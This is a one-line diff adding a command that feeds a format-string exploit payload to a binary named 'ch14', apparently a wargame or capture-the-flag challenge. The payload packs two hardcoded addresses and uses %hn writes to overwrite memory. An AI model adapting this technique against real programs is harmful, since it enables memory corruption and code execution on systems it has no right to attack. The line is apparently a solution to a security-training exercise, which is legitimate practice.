@@ -1,0 +1,1 @@
+./ch14 $(python -c 'import struct;print struct.pack("<I", 0xbffffac8) + struct.pack("<I", 0xbffffac8 + 2)')'%48871x%9$hn%8126x%10$hn'
